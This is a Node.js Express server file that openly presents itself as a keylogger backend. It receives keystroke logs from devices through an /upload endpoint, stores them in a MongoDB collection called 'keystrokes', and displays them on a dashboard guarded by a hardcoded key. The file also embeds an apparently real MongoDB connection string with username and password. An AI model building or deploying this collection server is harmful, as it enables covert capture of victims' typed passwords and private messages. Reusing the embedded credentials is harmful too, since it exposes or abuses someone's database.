const express = require('express');
const { MongoClient } = require('mongodb');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();

const SECRET_KEY = 'test123abc';  // keep simple for now

const mongoUri = 'mongodb+srv://rxmha2:mimimithila125@cluster0.c0qkq.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';

let cachedDb = null;
let cachedClient = null;

async function connectToDatabase() {
  if (cachedDb) return cachedDb;

  try {
    const client = new MongoClient(mongoUri, {
      connectTimeoutMS: 30000,
      serverSelectionTimeoutMS: 30000,
      maxPoolSize: 10,
      retryWrites: true,
    });

    await client.connect();
    const db = client.db('keylogger_db');

    cachedClient = client;
    cachedDb = db;
    console.log('MongoDB connected successfully');
    return db;
  } catch (err) {
    console.error('MongoDB connection failed:', err);
    throw err;  // let route handle it
  }
}

// Middleware
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, '../views'));

// POST /upload
app.post('/upload', async (req, res) => {
  let db;
  try {
    db = await connectToDatabase();
  } catch (err) {
    return res.status(500).json({ error: 'Database connection failed' });
  }

  const authHeader = req.headers['authorization'];
  if (!authHeader || authHeader !== `Bearer ${SECRET_KEY}`) {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  const { device, logs, timestamp } = req.body;
  if (!device || !logs || !timestamp) {
    return res.status(400).json({ error: 'Missing required fields' });
  }

  try {
    const result = await db.collection('keystrokes').insertOne({
      device,
      logs,
      timestamp,
      received_at: new Date().toISOString()
    });
    res.status(200).json({ success: true, id: result.insertedId });
  } catch (err) {
    console.error('Insert error:', err);
    res.status(500).json({ error: 'Database insert failed' });
  }
});

// GET /dashboard
app.get('/dashboard', async (req, res) => {
  let db;
  try {
    db = await connectToDatabase();
  } catch (err) {
    return res.status(500).send('Database connection failed - check logs');
  }

  const auth = req.query.auth;
  if (auth !== SECRET_KEY) {
    return res.status(401).send('Access denied. Invalid auth key.');
  }

  try {
    const logs = await db.collection('keystrokes')
      .find({})
      .sort({ received_at: -1 })
      .toArray();

    res.render('dashboard', { logs });
  } catch (err) {
    console.error('Query error:', err);
    res.status(500).send('Database query failed');
  }
});

// Root
app.get('/', (req, res) => {
  res.send('Keylogger Backend running. Dashboard: /dashboard?auth=yourkey');
});

module.exports = app;
